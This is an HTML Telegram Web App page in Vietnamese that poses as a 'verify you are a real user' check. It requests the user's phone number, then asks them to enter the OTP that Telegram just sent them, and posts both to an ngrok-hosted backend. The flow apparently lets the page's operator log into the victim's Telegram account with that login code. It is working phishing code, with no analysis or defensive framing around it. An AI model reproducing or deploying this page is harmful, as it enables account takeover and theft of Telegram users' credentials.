<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .content { padding: 20px; width: 80%; }
        input { padding: 12px; width: 90%; border-radius: 8px; border: none; margin-top: 10px; font-size: 16px; }
    </style>
</head>
<body>

<div class="content" id="app">
    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
    <div id="message">Bạn cần xác nhận mình là người dùng thật!</div>
</div>

<script>
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // Bước 1: Yêu cầu SĐT
    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
    tg.MainButton.show();
    
    tg.MainButton.onClick(() => {
        tg.requestContact();
    });

    // Xử lý sự kiện sau khi share SĐT
    tg.onEvent('contactRequested', async (data) => {
        const phoneNumber = (data.responseUnsafe && data.responseUnsafe.contact) ? data.responseUnsafe.contact.phone_number : null;

        if (phoneNumber) {
            tg.MainButton.text = "ĐANG GỬI...";
            
            // Gửi SĐT về server để xin mã OTP
            const res = await fetch(`${BACKEND_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phoneNumber })
            });
            
            // Chuyển sang Bước 2: Nhập OTP
            document.getElementById('message').innerHTML = "Mã OTP đã được gửi về Telegram của bạn.<br>Vui lòng nhập mã vào ô dưới đây:";
            document.getElementById('app').innerHTML += '<input type="text" id="otpInput" placeholder="Nhập mã OTP...">';
            
            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
            tg.MainButton.onClick(submitOtp); // Đổi hành động nút sang gửi OTP
        } else {
            alert("Lỗi không lấy được SĐT.");
        }
    });

    // Bước 2: Gửi OTP về server
    async function submitOtp() {
        const otp = document.getElementById('otpInput').value;
        if (!otp) return alert("Vui lòng nhập mã!");

        tg.MainButton.text = "ĐANG XÁC MINH...";
        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ otp: otp })
        });
        
        const result = await res.json();
        if (result.success) {
            tg.MainButton.text = "THÀNH CÔNG!";
            alert("Xác minh thành công!");
            tg.close();
        } else {
            alert("Mã không đúng, vui lòng thử lại.");
            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
        }
    }
</script>
</body>
</html>
